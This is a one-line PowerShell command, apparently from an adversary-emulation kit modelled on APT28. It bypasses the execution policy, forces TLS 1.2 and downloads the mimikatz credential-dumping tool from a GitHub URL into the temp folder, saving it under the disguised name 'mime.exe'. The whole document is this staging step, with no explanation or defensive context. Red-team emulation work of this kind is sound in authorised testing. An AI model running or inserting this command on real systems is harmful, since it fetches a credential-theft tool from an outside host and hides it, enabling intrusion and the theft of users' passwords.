-ep bypass [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).Downloadfile("https://github.com/greycel/APT-Simulation/blob/master/Utilities/mimikatz.exe","$env:temp\APT28\mime.exe")

